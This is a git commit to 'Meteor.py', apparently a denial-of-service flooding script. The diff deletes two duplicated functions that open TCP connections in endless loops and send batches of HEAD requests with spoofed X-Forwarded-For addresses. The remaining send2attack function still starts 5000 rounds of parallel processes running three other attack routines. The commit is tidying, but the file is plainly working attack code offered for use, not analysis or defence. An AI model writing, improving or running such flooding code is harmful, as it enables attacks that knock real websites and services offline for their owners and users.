c9608a2c22b0b28d08a1e6fe4f674780d62a4e0e
BigFatChicken <86238864+BigFatChicken@users.noreply.github.com>
2021-06-22 23:17:59 +0700

    Fixing Meteor.py
    Fixing Useless Code

--- Meteor.py
+++ Meteor.py
@@ -86,60 +86,16 @@ def attack3():
       pass
 
 
-def attack4():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-
-def attack5():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Attack starts here
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(1)
-    except:
-      pass
-
-
 def send2attack():
   for i in range(5000):
     mp = multiprocessing.Process(target=attack)
     mp2 = multiprocessing.Process(target=attack2)
-    mp3 = multiprocessing.Process(target=attack3)
-    mp4 = multiprocessing.Process(target=attack4)
-    mp5 = multiprocessing.Process(target=attack5)    
+    mp3 = multiprocessing.Process(target=attack3)  
     mp.setDaemon = False
     mp2.setDaemon = False
     mp3.setDaemon = False
-    mp4.setDaemon = False
-    mp5.setDaemon = False
     mp.start()
     mp2.start()
     mp3.start()
-    mp4.start()
-    mp5.start()
 
 send2attack()
